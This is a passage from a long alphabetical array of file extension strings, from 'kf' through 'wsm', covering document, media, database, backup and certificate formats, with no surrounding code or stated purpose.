          "kf",
          "kfm",
          "kfp",
          "kgtemp",
          "kid",
          "kismac",
          "klq",
          "klw",
          "kma",
          "kms",
          "kmy",
          "kmz",
          "kno",
          "knt",
          "kos",
          "kpdx",
          "kpf",
          "kpp",
          "kpr",
          "kpx",
          "kpz",
          "krc",
          "ksd",
          "ksm",
          "ksp",
          "kss",
          "ksw",
          "kth",
          "kuip",
          "kvtml",
          "kwd",
          "kwm",
          "kwp",
          "l",
          "l01",
          "l3dw",
          "l6t",
          "la",
          "label",
          "laccdb",
          "las",
          "lastlogin",
          "lat",
          "latex",
          "lav",
          "lax",
          "lay",
          "lay6",
          "layout",
          "lbf",
          "lbi",
          "lbl",
          "lbx",
          "lcb",
          "lcd",
          "lcf",
          "LCK",
          "lcm",
          "lcn",
          "ld2",
          "ldabak",
          "ldb",
          "ldif",
          "lef",
          "lev",
          "lex",
          "lfe",
          "lfp",
          "lg1",
          "lg2",
          "lgc",
          "lgf",
          "lgh",
          "lgi",
          "lgl",
          "lgp",
          "lhd",
          "lhr",
          "lib",
          "lib4d",
          "lif",
          "life",
          "lin",
          "list",
          "lit",
          "litemod",
          "livereg",
          "liveupdate",
          "lix",
          "LKG",
          "ll3",
          "llb",
          "llv",
          "llx",
          "LM",
          "lmd",
          "lmf",
          "lms",
          "lmx",
          "lng",
          "lngttarch2",
          "lnt",
          "lnx",
          "LO_",
          "loc",
          "localstorage",
          "LOG1",
          "logonxp",
          "lok",
          "lot",
          "lp",
          "lp2",
          "lp7",
          "lpa",
          "lpc",
          "lpd",
          "lpdb",
          "lpdf",
          "lpk",
          "lpkg",
          "lpmd",
          "lpp",
          "lpx",
          "lqm",
          "lrcat",
          "lrdata",
          "lrf",
          "lrlib",
          "lrlibrary",
          "lrm",
          "lrtoolkit",
          "ls3",
          "ls5",
          "lsa",
          "lsd",
          "lsf",
          "lsl",
          "lsp",
          "lsr",
          "lst",
          "lsu",
          "ltcx",
          "ltm",
          "ltr",
          "LTS",
          "ltx",
          "lua",
          "lud",
          "lut",
          "lutx",
          "lvd",
          "lvivt",
          "lvl",
          "lvm",
          "lvw",
          "lw4",
          "lwd",
          "lwo",
          "lwp",
          "lwx",
          "lx01",
          "lxf",
          "lxk",
          "ly",
          "lyt",
          "lyx",
          "m",
          "m13",
          "m14",
          "m2",
          "m2ts",
          "m3u",
          "m3u8",
          "m4a",
          "m4p",
          "m4u",
          "m4v",
          "m7p",
          "maca",
          "maf",
          "mag",
          "mai",
          "maker",
          "maml",
          "man",
          "manu",
          "map",
          "mapimail",
          "MAPSTYLE",
          "maq",
          "mar",
          "marc",
          "markdn",
          "mars",
          "marshal",
          "mas",
          "mass",
          "mat",
          "mav",
          "max",
          "maxfr",
          "maxm",
          "mba",
          "mbbk",
          "mbd",
          "mbf",
          "mbg",
          "mbi",
          "mbox",
          "mbp",
          "mbx",
          "mc1",
          "mc9",
          "mcat",
          "mcd",
          "mcdx",
          "mcf",
          "mcgame",
          "mcmac",
          "mcmeta",
          "mcp",
          "mcrp",
          "mcw",
          "mcx",
          "md",
          "md0",
          "md1",
          "md2",
          "md3",
          "md5",
          "md8",
          "mdbackup",
          "mdbhtml",
          "mdc",
          "mdccache",
          "mdd",
          "mddata",
          "mdg",
          "mdi",
          "mdinfo",
          "mdj",
          "mdk",
          "mdl",
          "mdm",
          "mdn",
          "mds",
          "mdsx",
          "MDT",
          "mdx",
          "MDZ",
          "mecontact",
          "med",
          "mef",
          "meg",
          "mega",
          "meh",
          "mell",
          "mellel",
          "mem",
          "menc",
          "menu",
          "meo",
          "merlin2",
          "met",
          "METADATA",
          "metadata_never_index",
          "mex",
          "mf",
          "mf4",
          "mfa",
          "mfe",
          "mfl",
          "mfo",
          "mfp",
          "mft",
          "mfu",
          "mfv",
          "mfw",
          "mga",
          "mgmt",
          "mgourmet",
          "mgourmet3",
          "mgourmet4",
          "mhp",
          "mht",
          "mhtenx",
          "mhtmlenx",
          "mi",
          "mic",
          "mid",
          "mif",
          "mim",
          "mime",
          "mindnode",
          "miniso",
          "mip",
          "mission",
          "mix",
          "mjd",
          "mjdoc",
          "mjk",
          "mkd",
          "mke",
          "mkv",
          "mla",
          "mlb",
          "mlc",
          "mlj",
          "mlm",
          "mls",
          "mlsxml",
          "mlx",
          "mm",
          "mm6",
          "mm7",
          "mm8",
          "mmap",
          "mmc",
          "mmd",
          "mme",
          "mmf",
          "mmjs",
          "mml",
          "mmm",
          "mmo",
          "mmp",
          "mmsw",
          "mmw",
          "mnc",
          "mng",
          "MNI",
          "mnk",
          "mno",
          "mny",
          "mo",
          "mobi",
          "mod",
          "MODEL",
          "MOF",
          "moho",
          "mol",
          "money",
          "moneywell",
          "mos",
          "mosaic",
          "mov",
          "movie",
          "mox",
          "moz",
          "mp1",
          "mp2",
          "mp4v",
          "mpa",
          "mpd",
          "mpe",
          "mpeg",
          "mpf",
          "mpg",
          "mph",
          "mpj",
          "mpkt",
          "mpp",
          "mppz",
          "mpq",
          "mpqge",
          "mpr",
          "mps",
          "mpt",
          "mpv",
          "mpv2",
          "mpx",
          "mpz",
          "mrd",
          "mrg",
          "mrimg",
          "mru",
          "mrw",
          "mrwref",
          "ms",
          "ms10",
          "msb",
          "msc",
          "msct",
          "msd",
          "mse",
          "msf",
          "msg",
          "mshc",
          "msie",
          "msim",
          "msl",
          "mso",
          "msor",
          "msp",
          "msq",
          "mss",
          "ms-tnef",
          "msw",
          "mswd",
          "mtdd",
          "mte",
          "mtf",
          "mtff",
          "mth",
          "MTL",
          "mtm",
          "mtml",
          "mto",
          "mtp",
          "mts",
          "mtw",
          "mtx",
          "mtxt",
          "mud",
          "mug",
          "mui",
          "mum",
          "mup",
          "mvd",
          "mvdx",
          "mvex",
          "mvm",
          "mw",
          "mwb",
          "mwd",
          "mwf",
          "mwii",
          "mwpd",
          "mwpp",
          "mws",
          "mwx",
          "mx",
          "mxad",
          "mxc2",
          "mxd",
          "mxg",
          "mxi",
          "mxl",
          "mxp",
          "myd",
          "mydocs",
          "myi",
          "myo",
          "mz",
          "n3",
          "nam",
          "names",
          "nap",
          "narrative",
          "nas",
          "nav",
          "navmap",
          "nb",
          "nb7",
          "nba",
          "nbak",
          "nbd",
          "nbe",
          "nbf",
          "nbi",
          "nbk",
          "nbp",
          "nbs",
          "nbu",
          "nc",
          "ncd",
          "ncf",
          "nco",
          "ncorx",
          "nct",
          "nd",
          "nda",
          "ndb",
          "ndd",
          "ndif",
          "ndk",
          "ndl",
          "ndr",
          "nds",
          "ndx",
          "ne1",
          "ne3",
          "nef",
          "nessus",
          "net",
          "neta",
          "netspd",
          "netspm",
          "NEW",
          "nfb",
          "nfc",
          "nfi",
          "nfl",
          "nfo",
          "nfs",
          "nfs11save",
          "ng",
          "NGR",
          "nitf",
          "njx",
          "nk2",
          "nl",
          "nlogo",
          "nlogo3d",
          "NLP",
          "NLT",
          "nma",
          "nmbtemplate",
          "nmea",
          "nmind",
          "nmm",
          "nmp",
          "nmu",
          "nn",
          "nni",
          "NNM",
          "nnp",
          "nnt",
          "nokogiri",
          "nop",
          "not",
          "note",
          "notebook",
          "now",
          "noy",
          "np",
          "npd",
          "npdf",
          "npf",
          "npl",
          "npp",
          "npr",
          "nps",
          "npt",
          "npy",
          "nrb",
          "nrbak",
          "nrc",
          "nrd",
          "nrf",
          "nrg",
          "nri",
          "nrl",
          "nrm",
          "nrmlib",
          "nrs",
          "nrt",
          "nru",
          "nrw",
          "nrx",
          "ns2",
          "ns3",
          "ns4",
          "nsd",
          "nsg",
          "nsh",
          "nsq",
          "nsr",
          "nst",
          "nt",
          "ntf",
          "ntl",
          "ntp",
          "nts",
          "ntx",
          "NU2",
          "number",
          "numbers",
          "nupkg",
          "NUS",
          "NUSPEC",
          "nv",
          "nv2",
          "nvd",
          "nvdl",
          "nvl",
          "nvm",
          "nvram",
          "nwb",
          "nwbak",
          "nwcab",
          "nwcp",
          "nwdb",
          "nwelicense",
          "nwo",
          "nwp",
          "nws",
          "nx^d",
          "nx__",
          "nx1",
          "nx2",
          "nxl",
          "nyf",
          "oa2",
          "oa3",
          "oab",
          "oad",
          "oas",
          "obb",
          "OBD",
          "OBE",
          "obj",
          "obk",
          "obr",
          "obt",
          "obx",
          "obz",
          "occ",
          "ocdc",
          "ocimf",
          "ocs",
          "od",
          "oda",
          "odb",
          "odc",
          "odccubefile",
          "odf",
          "odg",
          "odh",
          "odi",
          "odif",
          "odm",
          "odo",
          "odp",
          "ods",
          "odt",
          "odt#",
          "odttf",
          "odx",
          "odz",
          "oeaccount",
          "oeb",
          "oem",
          "ofc",
          "officeui",
          "ofm",
          "ofn",
          "oft",
          "ofx",
          "oga",
          "ogc",
          "ogg",
          "oggu",
          "ogm",
          "ogmu",
          "ogs",
          "oil",
          "ojz",
          "okm",
          "old",
          "ole",
          "ole2",
          "olf",
          "olk",
          "olk14event",
          "olk14group",
          "olk14note",
          "olk14task",
          "oll",
          "olm",
          "olt",
          "olv",
          "oly",
          "omcs",
          "omg",
          "omlog",
          "omp",
          "onb",
          "ond",
          "one",
          "onepkg",
          "ont",
          "ontx",
          "oo3",
          "oos",
          "oot",
          "op",
          "op2",
          "op4",
          "opal",
          "opax",
          "opd",
          "opf",
          "opj",
          "opju",
          "oplx",
          "opn",
          "opt",
          "opx",
          "opxs",
          "oqy",
          "or2",
          "or3",
          "or4",
          "or5",
          "or6",
          "ora",
          "orf",
          "org",
          "ori",
          "orig",
          "ORP",
          "ort",
          "orx",
          "osd",
          "osdx",
          "ost",
          "osz",
          "ot",
          "otc",
          "otf",
          "otg",
          "oth",
          "oti",
          "otl",
          "otln",
          "otn",
          "otp",
          "ots",
          "ott",
          "otw",
          "otx",
          "out",
          "ova",
          "ovd",
          "ovf",
          "ovolog",
          "ovx",
          "owc",
          "owl",
          "owx",
          "oxps",
          "oxt",
          "oyx",
          "p01",
          "p10",
          "p12",
          "p2g",
          "p2i",
          "p2s",
          "p3",
          "p3x",
          "p65",
          "p7b",
          "p7c",
          "p7x",
          "p7z",
          "p96",
          "p97",
          "pab",
          "pack",
          "pad",
          "paf",
          "pages",
          "pages-tef",
          "pak",
          "pan",
          "paq",
          "partimg",
          "pas",
          "pat",
          "paux",
          "paw",
          "pbd",
          "pbf",
          "pbix",
          "pbj",
          "PBK",
          "pbp",
          "pbr",
          "pbs",
          "pbx5script",
          "pbxscript",
          "pc",
          "pcap",
          "pcapng",
          "pcb",
          "pcc",
          "pcd",
          "pcf",
          "pch",
          "pcj",
          "pck",
          "pcr",
          "PCS",
          "pct",
          "pcv",
          "pcw",
          "pd",
          "pd4",
          "pd5",
          "pdas",
          "pdb",
          "pdc",
          "pdcr",
          "pdd",
          "pdf",
          "pdf_",
          "pdf_profile",
          "pdf_tsid",
          "pdfa",
          "pdfe",
          "pdfenx",
          "pdfig",
          "pdfl",
          "pdfua",
          "pdfvt",
          "pdfx",
          "pdfxml",
          "pdfz",
          "pdg",
          "pdi",
          "pdm",
          "pdo",
          "pdp",
          "pds",
          "pdw",
          "pdx",
          "pdz",
          "peb",
          "pef",
          "pem",
          "pep",
          "PERF",
          "pes",
          "pex",
          "pez",
          "pf",
          "pfc",
          "pfd",
          "pfl",
          "pfm",
          "pfsx",
          "pft",
          "pfx",
          "pg",
          "pgd",
          "pgs",
          "phb",
          "phd",
          "phm",
          "php",
          "phr",
          "phs",
          "pih",
          "pixexp",
          "pj2",
          "pj4",
          "pj5",
          "pjm",
          "pjt",
          "pk",
          "pka",
          "pkb",
          "pkey",
          "pkg",
          "pkh",
          "pkpass",
          "pks",
          "pkt",
          "pl",
          "plan",
          "planner",
          "plb",
          "plc",
          "pld",
          "pli",
          "pln",
          "pls",
          "plt",
          "plus_muhd",
          "plw",
          "pm",
          "PM2",
          "pm3",
          "pm4",
          "pm5",
          "pm6",
          "pm7",
          "pmatrix",
          "pmd",
          "pmf",
          "pml",
          "pmm",
          "pmo",
          "pmr",
          "pmt",
          "pmv",
          "pmx",
          "pnproj",
          "pns",
          "pnu",
          "pnz",
          "po",
          "POC",
          "pod",
          "poi",
          "pool",
          "popshape",
          "por",
          "pot",
          "pothtml",
          "potm",
          "potx",
          "pp",
          "pp2",
          "pp3",
          "ppam",
          "ppd",
          "ppdf",
          "ppf",
          "ppj",
          "ppp",
          "ppr",
          "pps",
          "ppsenx",
          "ppsm",
          "ppsx",
          "ppt",
          "ppte",
          "ppthtml",
          "pptl",
          "pptm",
          "pptmhtml",
          "pptt",
          "pptx",
          "ppws",
          "ppx",
          "prc",
          "prd",
          "prdx",
          "pref",
          "prel",
          "prf",
          "printcd2",
          "prj",
          "prn",
          "pro",
          "pro4",
          "pro4dvd",
          "pro4pl",
          "pro4plx",
          "pro4x",
          "pro5",
          "pro5dvd",
          "pro5pl",
          "pro5plx",
          "pro5x",
          "pro6plx",
          "proofingtool",
          "props",
          "proqc",
          "prproj",
          "prr",
          "prs",
          "prt",
          "prtc",
          "prv",
          "prx",
          "ps",
          "PS1XML",
          "ps2",
          "ps3",
          "psa",
          "psafe3",
          "psb",
          "psd",
          "PSD1",
          "pse8db",
          "psf",
          "psg",
          "psi2",
          "psip",
          "psk",
          "psm",
          "PSM1",
          "psmd",
          "pspd",
          "pspimage",
          "pss",
          "pst",
          "psv",
          "psw",
          "psw6",
          "pswx",
          "psz",
          "pt3",
          "pt6",
          "ptb",
          "ptc",
          "ptf",
          "pth",
          "ptk",
          "ptn",
          "ptn2",
          "pts",
          "ptx",
          "PTXML",
          "ptz",
          "pub",
          "pubf",
          "pubhtml",
          "pubmhtml",
          "pubx",
          "puz",
          "pvd",
          "pve",
          "pvf",
          "pvhd",
          "pvm",
          "pvw",
          "pw",
          "pwd",
          "pwe",
          "pwf",
          "pwi",
          "pwm",
          "pwp",
          "pwre",
          "pxd",
          "pxf",
          "pxi",
          "pxj",
          "pxl",
          "pxp",
          "py",
          "pys",
          "pzc",
          "pzf",
          "pzt",
          "q07",
          "q08",
          "q09",
          "q3d",
          "qb",
          "qb2005",
          "qb2006",
          "qb2007",
          "qb2009",
          "qb2010",
          "qb2011",
          "qb2012",
          "qb2013",
          "qb2014",
          "qb2015",
          "qb2016",
          "qb2017",
          "qba",
          "qbatlg",
          "qbb",
          "qbj",
          "qbk",
          "qbl",
          "qbm",
          "qbmb",
          "qbmd",
          "qbr",
          "qbw",
          "qbx",
          "qbxml",
          "qby",
          "qch",
          "qcow",
          "qcow2",
          "qct",
          "qdat",
          "qdb",
          "qdf",
          "qdf-backup",
          "qdfm",
          "qdfx",
          "qdp",
          "qdt",
          "qed",
          "qel",
          "qf",
          "qfilter",
          "qfl",
          "qfx",
          "qfxx",
          "qhp",
          "qht",
          "qhtm",
          "qic",
          "qif",
          "qlgenerator",
          "qm",
          "qmbl",
          "qmtf",
          "qpb",
          "qpf",
          "qph",
          "qpx",
          "qrc",
          "qrmx",
          "qrp",
          "qrt",
          "qry",
          "qs",
          "qsd",
          "qsf",
          "qt",
          "qtq",
          "qtr",
          "qtw",
          "QUE",
          "quiz",
          "quox",
          "qv~",
          "qvd",
          "qvf",
          "qvp",
          "qvw",
          "qwd",
          "qwt",
          "qxb",
          "qxd",
          "qxf",
          "qxl",
          "qxp",
          "qxt",
          "r00",
          "r01",
          "r02",
          "r03",
          "r0f",
          "r0z",
          "r3d",
          "ra",
          "ra2",
          "raf",
          "ral",
          "ram",
          "ramd",
          "rap",
          "rar",
          "RAT",
          "ratdvd",
          "raw",
          "ray",
          "razy",
          "rb",
          "rbc",
          "rbf",
          "rbk",
          "rbs",
          "rbt",
          "rcb",
          "rcc",
          "rcd",
          "rcg",
          "rcl",
          "rctd",
          "rcx",
          "rd",
          "rd1",
          "rda",
          "rdata",
          "rdb",
          "rdf",
          "rdfs",
          "rdg",
          "rdi",
          "RDLC",
          "rdlx",
          "rdo",
          "rdoc",
          "rdoc_options",
          "rdx",
          "rdz",
          "re4",
          "reb",
          "rec",
          "redif",
          "ref",
          "reference",
          "rel",
          "rels",
          "rep",
          "res",
          "resbuild",
          "RESJSON",
          "rest",
          "result",
          "RESW",
          "ret",
          "rev",
          "rez",
          "rf",
          "rf1",
          "rfa",
          "rfo",
          "rft",
          "rge",
          "rgmb",
          "rgmc",
          "rgn",
          "rgo",
          "rgss3a",
          "rha",
          "rhif",
          "rhistory",
          "rim",
          "rit",
          "rl",
          "rlf",
          "rll",
          "rm",
          "rm5",
          "rmbak",
          "rmd",
          "rmf",
          "rmh",
          "rmuf",
          "rmx",
          "rna",
          "rng",
          "rnq",
          "rnt",
          "rnw",
          "ro3",
          "roadtrip",
          "roca",
          "rod",
          "rodx",
          "rodz",
          "rofl",
          "rog",
          "roi",
          "ROM",
          "ros",
          "rou",
          "rov",
          "row",
          "rox",
          "roxio",
          "roz",
          "rp",
          "rpa",
          "rpd",
          "rpf",
          "RPO",
          "rpp",
          "rpprj",
          "rpres",
          "rpt",
          "rptr",
          "rpyb",
          "rrd",
          "rrpa",
          "rrr",
          "rrt",
          "rrx",
          "rs",
          "rsc",
          "rsd",
          "rsdf",
          "rsdoc",
          "rsf",
          "rsm",
          "rso",
          "rsp",
          "rsrc",
          "rst",
          "rsv",
          "rsw",
          "rt",
          "rt_",
          "rta",
          "rtdf",
          "rte",
          "rtf",
          "rtf_",
          "rtfd",
          "rtk",
          "rtp",
          "rtpi",
          "rts",
          "rtsl",
          "rtstn",
          "rtsx",
          "rtttl",
          "rtwsh",
          "rtx",
          "ruel",
          "rum",
          "run",
          "rupaf",
          "rv",
          "rvf",
          "rvl",
          "rvt",
          "rw2",
          "rwd",
          "rwg",
          "rwl",
          "rwlibrary",
          "rws",
          "rwz",
          "rxdoc",
          "rzk",
          "rzx",
          "s3db",
          "s85",
          "s8bn",
          "sa5",
          "sa7",
          "sa8",
          "saas",
          "sad",
          "saf",
          "safe",
          "safetext",
          "sah",
          "sam",
          "sar",
          "sas7bdat",
          "sav",
          "save",
          "say",
          "sb",
          "sbc",
          "sbd",
          "sbf",
          "sbn",
          "sbo",
          "sbpf",
          "sbs",
          "sbsc",
          "sbst",
          "sbu",
          "sbw",
          "sbx",
          "sc2save",
          "sc4",
          "sc45",
          "sca",
          "scd",
          "scdoc",
          "sce",
          "scf",
          "scg",
          "scgc",
          "scgp",
          "scgs",
          "sch",
          "SCHEMA",
          "scm",
          "scmt",
          "scn",
          "sco",
          "scr",
          "scriv",
          "scrivx",
          "scs",
          "scspack",
          "scssc",
          "sct",
          "scw",
          "scx",
          "scz",
          "sd",
          "sd0",
          "sd1",
          "sda",
          "sdb",
          "sdc",
          "sdd",
          "sddraft",
          "sdi",
          "sdl",
          "sdlxliff",
          "sdmdocument",
          "sdn",
          "sdo",
          "sdoc",
          "sdp",
          "sdr",
          "sds",
          "sdsk",
          "sdt",
          "sdv",
          "sdw",
          "sdz",
          "se1",
          "SEARCH-MS",
          "secure",
          "seed",
          "sef",
          "sel",
          "sen",
          "seo",
          "seq",
          "sequ",
          "server",
          "ses",
          "set",
          "setup",
          "sev",
          "sfd",
          "sff",
          "sfs",
          "sfx",
          "sgf",
          "sgi",
          "sgl",
          "sgm",
          "sgml",
          "sgz",
          "sh",
          "sh6",
          "shar",
          "shb",
          "show",
          "SHP",
          "shr",
          "shs",
          "shtml",
          "shw",
          "shx",
          "shy",
          "sic",
          "sid",
          "sidd",
          "sidn",
          "sidx",
          "sie",
          "sig",
          "sik",
          "sim",
          "sis",
          "skb",
          "skv",
          "skx",
          "sky",
          "sla",
          "sldm",
          "sldtm",
          "sldx",
          "sle",
          "slf",
          "slk",
          "SLL",
          "slm",
          "slp",
          "slt",
          "slx",
          "slz",
          "sm",
          "smc",
          "smd",
          "sme",
          "smf",
          "smh",
          "smi",
          "smlx",
          "smn",
          "smp",
          "smpkg",
          "sms",
          "smwt",
          "smx",
          "smz",
          "sn1",
          "sn2",
          "sna",
          "snag",
          "snapshot",
          "snb",
          "snf",
          "sng",
          "snk",
          "snp",
          "sns",
          "snt",
          "snx",
          "so",
          "soi",
          "sp",
          "spb",
          "spd",
          "spdf",
          "speccy",
          "spf",
          "spg",
          "spj",
          "spk",
          "spl",
          "spm",
          "spml",
          "sppt",
          "spq",
          "spr",
          "sprt",
          "sprz",
          "sps",
          "spt",
          "spub",
          "spv",
          "sq",
          "sqb",
          "sqd",
          "sqf",
          "sqfs",
          "sql",
          "sqlite",
          "sqlite3",
          "sqlitedb",
          "sqllite",
          "sqr",
          "sqx",
          "sr2",
          "src",
          "SRD",
          "SRD-SHM",
          "SRD-WAL",
          "srf",
          "srfl",
          "srr",
          "srs",
          "srt",
          "srw",
          "ssa",
          "ssc",
          "ssd",
          "ssh",
          "ssi",
          "ssiw",
          "ssm",
          "ssp",
          "ssv",
          "ssx",
          "st",
          "st4",
          "st5",
          "st6",
          "st7",
          "st8",
          "sta",
          "stc",
          "std",
          "stdl",
          "STF",
          "stg",
          "sti",
          "stk",
          "stl",
          "stm",
          "STORE",
          "stp",
          "stproj",
          "stpz",
          "str",
          "struct",
          "stt",
          "stu",
          "stw",
          "stx",
          "stxt",
          "sty",
          "styk",
          "stykz",
          "sub",
          "sud",
          "suf",
          "sum",
          "surf",
          "sv$",
          "sv2i",
          "svd",
          "svdl",
          "svf",
          "svg",
          "svi",
          "svm",
          "svn",
          "svp",
          "svr",
          "svs",
          "swd",
          "swdoc",
          "sweb",
          "swf",
          "SWIDTAG",
          "switch",
          "swk",
          "swp",
          "sx",
          "sxc",
          "sxd",
          "sxe",
          "sxg",
          "sxi",
          "sxl",
          "sxm",
          "sxml",
          "sxw",
          "syn",
          "syncdb",
          "t",
          "t01",
          "t02",
          "t03",
          "t04",
          "t05",
          "t06",
          "t07",
          "t08",
          "t09",
          "t10",
          "t11",
          "t12",
          "t13",
          "t14",
          "t15",
          "t16",
          "t17",
          "t18",
          "t2",
          "t2k",
          "t2ks",
          "t2kt",
          "t2t",
          "t4g",
          "t64",
          "t80",
          "ta1",
          "ta2",
          "ta4",
          "ta5",
          "ta6",
          "ta7",
          "ta8",
          "ta9",
          "tab",
          "tabula-doc",
          "tabula-docstyle",
          "tac",
          "tag",
          "tah",
          "tao",
          "tap",
          "tar",
          "tardist",
          "TARGETS",
          "tax",
          "tax08",
          "tax09",
          "tax10",
          "tax11",
          "tax12",
          "tax13",
          "tax15",
          "tax16",
          "tax17",
          "tax2008",
          "tax2009",
          "tax2010",
          "tax2011",
          "tax2012",
          "tax2013",
          "tax2014",
          "tax2015",
          "tax2016",
          "tax2017",
          "tax2018",
          "tax2019",
          "tb",
          "tbb",
          "tbd",
          "tbh",
          "tbk",
          "tbkx",
          "tbl",
          "tbx",
          "tbz2",
          "tc",
          "tcc",
          "tcd",
          "tch",
          "tck",
          "tclogs",
          "tcnet",
          "tcx",
          "td0",
          "tda",
          "TDAT",
          "tdb",
          "tde",
          "tdg",
          "tdl",
          "tdm",
          "tdms",
          "tdoc",
          "tdr",
          "tdt",
          "te",
          "te1",
          "te3",
          "teacher",
          "ted",
          "tef",
          "template",
          "temx",
          "ter",
          "terrn",
          "terrn2",
          "tet",
          "tex",
          "texi",
          "texinfo",
          "text",
          "textclipping",
          "textile",
          "tfa",
          "tfd",
          "tfm",
          "tfr",
          "tfrd",
          "tg",
          "tga",
          "tgc",
          "tgd",
          "tgf",
          "tgz",
          "THA",
          "thm",
          "thml",
          "thmx",
          "thr",
          "tib",
          "tibkp",
          "tie",
          "tif",
          "tiff",
          "tig",
          "time",
          "timeline",
          "tis",
          "tjp",
          "tk3",
          "tkfl",
          "tl5",
          "tlb",
          "tld",
          "tlg",
          "tlp",
          "tlt",
          "tlx",
          "tlz",
          "tm",
          "tm3",
          "tmb",
          "tmd",
          "TME",
          "tml",
          "tmlanguage",
          "tmp",
          "tmr",
          "tmv",
          "tmw",
          "tmx",
          "tmz",
          "tmzip",
          "tns",
          "tnsp",
          "toast",
          "toc",
          "TON",
          "top",
          "topc",
          "topx",
          "tor",
          "torrent",
          "totalsdb",
          "totalslayout",
          "tp",
          "tpb",
          "tpd",
          "tpf",
          "tpl",
          "tpo",
          "tps",
          "tpsdb",
          "tpu",
          "tpx",
          "tqs",
          "tra",
          "trashinfo",
          "trc",
          "trd",
          "TRE",
          "trf",
          "trif",
          "trk",
          "trm",
          "trn",
          "trp",
          "trs",
          "trx",
          "ts",
          "tsc",
          "tsk",
          "tsl",
          "tsr",
          "tst",
          "tsv",
          "tt10",
          "tt11",
          "tt12",
          "tt13",
          "tt14",
          "tt15",
          "tt16",
          "tt17",
          "tt18",
          "tt2",
          "ttax",
          "ttbk",
          "ttd",
          "ttk",
          "ttmd",
          "TTS",
          "ttskey",
          "ttxt",
          "tu",
          "tur",
          "tvc",
          "tvd",
          "tvdownload",
          "twb",
          "twbx",
          "twdi",
          "twdx",
          "twh",
          "twm",
          "tww",
          "twz",
          "twzip",
          "tx",
          "txa",
          "txd",
          "txe",
          "txf",
          "txm",
          "txn",
          "txtrpt",
          "tyimport",
          "tyset",
          "tzx",
          "u10",
          "u11",
          "u12",
          "u3d",
          "uax",
          "ubj",
          "ubox",
          "ubz",
          "uccapilog",
          "ucd",
          "uci",
          "ud",
          "udb",
          "udc",
          "udeb",
          "udf",
          "udl",
          "uds",
          "UDT",
          "uea",
          "ufs",
          "uhtml",
          "uibak",
          "uif",
          "ukr",
          "ulf",
          "uli",
          "ulp",
          "ulys",
          "ulz",
          "umf",
          "ump",
          "umx",
          "UNINSTALL",
          "unity3d",
          "unr",
          "UNT",
          "unx",
          "uof",
          "uop",
          "uos",
          "uot",
          "update",
          "updf",
          "upk",
          "upoi",
          "upp",
          "upr",
          "urd-journal",
          "urf",
          "url",
          "urp",
          "usa",
          "useq",
          "usr",
          "ustar",
          "usx",
          "ut2",
          "ut3",
          "utc",
          "utd",
          "ute",
          "utf8",
          "uti",
          "utm",
          "uts",
          "utx",
          "uu",
          "uud",
          "uue",
          "uvf",
          "uvw",
          "uvx",
          "uwl",
          "uwrf",
          "uxx",
          "v",
          "v12",
          "v2i",
          "v2t",
          "val",
          "vaporcd",
          "vault",
          "vbadoc",
          "vbd",
          "vbk",
          "vbm",
          "vbox",
          "vbox-prev",
          "vbpf1",
          "vbs",
          "vbw",
          "VBX",
          "vc",
          "vc4",
          "vc6",
          "vc8",
          "vcal",
          "vcd",
          "vce",
          "vcf",
          "VCH",
          "vco",
          "vcp",
          "vcrd",
          "vcs",
          "vct",
          "vcx",
          "vdb",
          "vdf",
          "vdi",
          "vdo",
          "vdoc",
          "vdt",
          "vdx",
          "vec",
          "VER",
          "vf",
          "vfd",
          "vff",
          "vfs",
          "vfs0",
          "vhd",
          "vhdx",
          "vi",
          "vibe",
          "view",
          "vip",
          "vis",
          "viz",
          "vlc",
          "vle",
          "vlg",
          "vlt",
          "vmbx",
          "vmdk",
          "vmf",
          "vmg",
          "vmm",
          "vmsd",
          "vmsn",
          "vmss",
          "vmt",
          "vmwarevm",
          "vmx",
          "vmxf",
          "vob",
          "voi",
          "vok",
          "volarchive",
          "voprefs",
          "vor",
          "vp",
          "vpcbackup",
          "vpd",
          "vpk",
          "vpl",
          "vpol",
          "vpp",
          "vpp_pc",
          "vpx",
          "vrb",
          "vrd",
          "VRG",
          "vrp",
          "vs",
          "vsch",
          "vscontent",
          "vsd",
          "VSDIR",
          "vsdx",
          "vsf",
          "vsi",
          "vspolicy",
          "vssm",
          "vssx",
          "vst",
          "vstx",
          "vsv",
          "vsx",
          "vtf",
          "vthought",
          "vtv",
          "vtx",
          "vud",
          "vvf",
          "vvv",
          "vw",
          "vw3",
          "vxml",
          "vym",
          "vzm",
          "w",
          "w01",
          "w02",
          "W2B",
          "w2p",
          "w3g",
          "w3x",
          "w51",
          "w52",
          "w60",
          "w61",
          "w6bn",
          "w6w",
          "w8bn",
          "w8tn",
          "wab",
          "wac",
          "wad",
          "waff",
          "wallet",
          "walletx",
          "war",
          "wav",
          "wave",
          "waw",
          "wb",
          "wb1",
          "wb2",
          "wb3",
          "wbb",
          "wbcat",
          "WBF",
          "wbi",
          "wbk",
          "wbt",
          "wbxml",
          "wbz",
          "wcat",
          "wcd",
          "wcf",
          "wcl",
          "wcn",
          "wcp",
          "wcst",
          "wd0",
          "wd1",
          "wd2",
          "wd3",
          "wdb",
          "wdbn",
          "wdf",
          "wdgt",
          "wdl",
          "wdn",
          "wdoc",
          "wdq",
          "wdx9",
          "wea",
          "web",
          "webapp",
          "webdoc",
          "webpart",
          "wep",
          "WER",
          "wflx",
          "wfm",
          "wgt",
          "whf",
          "wht",
          "wid",
          "WIH",
          "wii",
          "wil",
          "wim",
          "win",
          "winclone",
          "wiz",
          "wjf",
          "wjr",
          "wk!",
          "wk1",
          "wk2",
          "wk3",
          "wk4",
          "wk5",
          "wkb",
          "wke",
          "wki",
          "wkl",
          "wks",
          "wlb",
          "wld",
          "wll",
          "wls",
          "wlx",
          "wlxml",
          "wlz",
          "wm",
          "wma",
          "wmd",
          "wmdb",
          "wmf",
          "wmga",
          "wmk",
          "wml",
          "wmlc",
          "wmmp",
          "wmo",
          "wms",
          "wmt",
          "wmv",
          "wmx",
          "wn",
          "wnk",
          "wolf",
          "word",
          "wordlist",
          "world",
          "wotreplay",
          "wow",
          "woz",
          "wp",
          "wp42",
          "wp5",
          "wp50",
          "wp6",
          "wp7",
          "wpa",
          "wpb",
          "wpc",
          "wpc2",
          "wpd",
          "wpd0",
          "wpd1",
          "wpd2",
          "wpd3",
          "wpe",
          "wpf",
          "wpk",
          "wpl",
          "wpo",
          "wpost",
          "wps",
          "wpt",
          "wpw",
          "wr1",
          "wrf",
          "wri",
          "wrk",
          "wrlk",
          "ws",
          "ws1",
          "ws2",
          "ws3",
          "ws4",
          "ws5",
          "ws6",
          "ws7",
          "WSB",
          "WSC",
          "wsd",
          "wsf",
          "wsh",
          "wsi",
          "wsm",
